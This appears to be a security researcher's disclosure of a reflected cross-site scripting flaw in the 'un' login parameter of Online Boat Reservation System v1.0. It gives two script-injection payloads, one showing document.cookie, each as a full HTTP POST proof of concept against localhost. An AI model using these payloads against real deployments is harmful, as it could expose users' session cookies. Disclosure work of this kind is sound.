# Online Boat Reservation System v1.0 by winex01 has Cross-site scripting (reflected)

BUG_Author: jidle

Vulnerability File: /boat/login.php

Parameter "un" (POST), exists XSS vulnerability

Payload1:un=a%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3Ea&up=bb&login=

#POC：

```
POST /boat/login.php HTTP/1.1
Host: localhost
Content-Length: 71
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/boat/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=93hsohaq8jq20vpubcrlbfap8c
Connection: close

un=a%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3Ea&up=bb&login=
```

![image](https://github.com/jidle123/picture/blob/main/xss.png)

Payload2:un=a%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3Ea&up=bbb&login=

#POC：

```
POST /boat/login.php HTTP/1.1
Host: localhost
Content-Length: 78
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/boat/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=93hsohaq8jq20vpubcrlbfap8c
Connection: close

un=a%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3Ea&up=bbb&login=
```

![image](https://github.com/jidle123/picture/blob/main/cookie.png)
